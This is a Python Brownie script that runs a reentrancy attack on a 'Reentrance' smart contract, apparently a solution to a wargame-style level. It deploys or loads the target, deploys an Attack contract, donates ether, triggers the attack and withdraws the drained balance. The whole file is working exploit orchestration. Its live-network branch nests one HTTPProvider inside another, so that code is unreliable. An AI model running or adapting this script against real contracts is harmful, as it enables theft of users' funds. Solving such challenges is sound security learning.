from brownie import Contract, Attack, Reentrance, network, config
from scripts.helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():

    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        reentrance = Reentrance.deploy({"from": get_account(index=1)})

        get_account(index=1).transfer(reentrance, "0.001 ether").wait(1)

        attack = Attack.deploy(reentrance, {"from": account})

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                Web3.HTTPProvider(config["networks"][network.show_active()]["infura"])
            )
        )

        reentrance = Contract.from_abi(
            Reentrance._name,
            config["networks"][network.show_active()]["reentrance"],
            Reentrance.abi,
        )

        attack = Attack.deploy(reentrance, {"from": account})

    reentrance.donate(attack, {"from": account, "value": "1 ether"}).wait(1)
    attack.attack({"from": account, "gas_limit": 10000000}).wait(1)
    attack.withdraw({"from": account}).wait(1)

    print(f"Reentrance balance is {Web3.fromWei(reentrance.balance(), 'ether')} ether")
    print(f"My balance is {Web3.fromWei(account.balance(), 'ether')} ether")


def main():
    attack()
